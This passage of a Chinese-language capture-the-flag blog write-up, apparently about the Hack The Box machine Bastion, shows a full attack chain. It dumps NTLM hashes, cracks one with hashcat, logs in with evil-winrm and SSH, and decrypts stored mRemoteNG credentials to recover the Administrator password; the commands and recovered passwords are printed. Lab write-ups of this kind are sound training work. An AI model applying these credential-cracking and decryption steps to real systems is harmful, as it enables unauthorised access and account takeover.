+<p><code class="notranslate">DefaultPassword</code> 出现表明该系统上有一个或多个服务、应用程序或配置，<strong>在 LSA 存储中注册了一个名为 <code class="notranslate">DefaultPassword</code> 的敏感凭据</strong>。对于渗透测试来说，这通常是一个<strong>高价值的发现</strong>，因为该密码很可能在系统中的其他地方被重用</p>
+<markdown-accessiblity-table><table role="table">
+<thead>
+<tr>
+<th><strong>用户名</strong></th>
+<th><strong>RID</strong></th>
+<th><strong>LM Hash</strong></th>
+<th><strong>NT Hash</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Administrator</strong></td>
+<td>500</td>
+<td><code class="notranslate">aad3b435b51404eeaad3b435b51404ee</code></td>
+<td><code class="notranslate">31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
+</tr>
+<tr>
+<td>Guest</td>
+<td>501</td>
+<td><code class="notranslate">aad3b435b51404eeaad3b435b51404ee</code></td>
+<td><code class="notranslate">31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
+</tr>
+<tr>
+<td><strong>L4mpje</strong></td>
+<td>1000</td>
+<td><code class="notranslate">aad3b435b51404eeaad3b435b51404ee</code></td>
+<td><code class="notranslate">26112010952d963c8dc4217daec986d9</code></td>
+</tr>
+<tr>
+<td><code class="notranslate">31d6cfe0d16ae931b73c59d7e0c089c0</code>就是空密码</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p>可以再破解一下L4mpje密码</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> hashcat -m 1000 l4mpje_ntlm.txt --show</span>
+26112010952d963c8dc4217daec986d9:bureaulampje</pre></div>
+<p>密码复用了，如果这个密码是强密码的话，hashcat跑不出来也可以考虑下密码复用</p>
+<h1>立足点</h1>
+<p>靶机开放了winrm以及ssh，都可以用凭据试一下</p>
+<p>不过winrm连接失败了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> evil-winrm -i 10.129.136.29 -u 'L4mpje' -p 'bureaulampje'</span>
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="pl-s"><span class="pl-pds">`</span>quoting_detection_proc<span class="pl-s"><span class="pl-pds">'</span> for module Reline</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Info: Establishing connection to remote endpoint</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</span></span>
+<span class="pl-s"><span class="pl-s"></span></span>
+<span class="pl-s"><span class="pl-s">Error: Exiting with code 1</span></span></pre></div>
+<h3>WinRM 的权限要求</h3>
+<p>默认情况下，Windows 限制了哪些用户组可以通过 WinRM 连接到系统。低权限用户 (<code class="notranslate">L4mpje</code>) 无法连接，是因为：</p>
+<ol>
+<li>
+<p><strong>非管理员限制：</strong> WinRM 默认要求用户是 <strong>Administrators (管理员)</strong> 组的成员，或者必须是 <strong>Remote Management Users (远程管理用户)</strong> 组的成员。</p>
+</li>
+<li>
+<p><strong><code class="notranslate">L4mpje</code> 是低权限用户：</strong> 之前的分析已经确定 <code class="notranslate">L4mpje</code> 不是本地管理员，因此它不属于 Administrators 组，很可能也不属于 Remote Management Users 组。</p>
+</li>
+</ol>
+<p>ssh连接可以成功，发现装了个mRmoteNG</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">l4mpje@BASTION C:<span class="pl-cce">\P</span>rogram Files (x86)<span class="pl-k">&gt;</span>dir
+ Volume <span class="pl-k">in</span> drive C has no label.
+ Volume Serial Number is 1B7D-E692
+
+ Directory of C:<span class="pl-cce">\P</span>rogram Files (x86)
+
+22-02-2019  14:01    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          <span class="pl-c1">.</span>
+22-02-2019  14:01    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          ..
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Common Files
+23-02-2019  09:38    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Internet Explorer
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Microsoft.NET
+22-02-2019  14:01    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          mRemoteNG
+23-02-2019  10:22    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Defender
+23-02-2019  09:38    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Mail
+23-02-2019  10:22    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Media Player
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Multimedia Platform
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows NT
+23-02-2019  10:22    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Photo Viewer
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Windows Portable Devices
+16-07-2016  14:23    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          WindowsPowerShell
+               0 File(s)              0 bytes
+              14 Dir(s)   4.797.595.648 bytes free</pre></div>
+<h2>🔑 提权思路：利用 mRemoteNG 凭据</h2>
+<p>由于 <code class="notranslate">mRemoteNG</code> 是一个远程连接工具，<strong>几乎肯定</strong>存储了用户 <strong>L4mpje</strong> 或其他管理员连接到服务器的<strong>保存凭据</strong>。</p>
+<p><strong>🚨 关键点：</strong> <code class="notranslate">mRemoteNG</code> 在默认配置下，会使用 Windows 的 <strong>DPAPI</strong> (Data Protection API) 来<strong>加密</strong>存储在 XML 文件中的密码。</p>
+<ul>
+<li>
+<p><strong>如果密码是明文/简单的 Base64：</strong> 你将直接获得高权限账户（如 Administrator）的密码。</p>
+</li>
+<li>
+<p><strong>如果密码是 DPAPI 加密数据：</strong> 你需要将该加密数据和你在 VHD 文件中提取的 <strong>DPAPI_SYSTEM</strong> 或 <strong>DPAPI_USERKEY</strong> 密钥结合使用，才能解密出明文密码。</p>
+</li>
+</ul>
+<p>可以找到config文件</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">l4mpje@BASTION C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\L</span>4mpje<span class="pl-cce">\A</span>ppData<span class="pl-cce">\R</span>oaming<span class="pl-cce">\m</span>RemoteNG<span class="pl-k">&gt;</span>dir
+ Volume <span class="pl-k">in</span> drive C has no label.
+ Volume Serial Number is 1B7D-E692
+
+ Directory of C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\L</span>4mpje<span class="pl-cce">\A</span>ppData<span class="pl-cce">\R</span>oaming<span class="pl-cce">\m</span>RemoteNG
+
+22-02-2019  14:03    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          <span class="pl-c1">.</span>
+22-02-2019  14:03    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          ..
+22-02-2019  14:03             6.316 confCons.xml
+22-02-2019  14:02             6.194 confCons.xml.20190222-1402277353.backup
+22-02-2019  14:02             6.206 confCons.xml.20190222-1402339071.backup
+22-02-2019  14:02             6.218 confCons.xml.20190222-1402379227.backup
+22-02-2019  14:02             6.231 confCons.xml.20190222-1403070644.backup
+22-02-2019  14:03             6.319 confCons.xml.20190222-1403100488.backup
+22-02-2019  14:03             6.318 confCons.xml.20190222-1403220026.backup
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403261268.backup
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403272831.backup
+22-02-2019  14:03             6.315 confCons.xml.20190222-1403433299.backup
+22-02-2019  14:03             6.316 confCons.xml.20190222-1403486580.backup
+22-02-2019  14:03                51 extApps.xml
+22-02-2019  14:03             5.217 mRemoteNG.log
+22-02-2019  14:03             2.245 pnlLayout.xml
+22-02-2019  14:01    <span class="pl-k">&lt;</span>DIR<span class="pl-k">&gt;</span>          Themes
+              14 File(s)         76.577 bytes
+               3 Dir(s)   4.797.595.648 bytes free</pre></div>
+<p>复制一下拿到本地跑一下就出了</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(.venv)─(root㉿MJ)-[/tmp/test]
+└─<span class="pl-c"><span class="pl-c">#</span> python3 mRemoteNG.py -rf config.xml</span>
+Username: Administrator
+Hostname: 127.0.0.1
+Password: thXLHM96BeKL0ER2
+
+Username: L4mpje
+Hostname: 192.168.1.75
+Password: bureaulampje</pre></div>
+<p>按理说再用winrm应该就可以上去了，不过可能是开启了远程 UAC 限制所以一样上不去，ssh连一下就行了，psexec也是能上去的</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://faabbi.github.io">MJ</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行 "+diffDay+" 天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","faabbi/faabbi.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
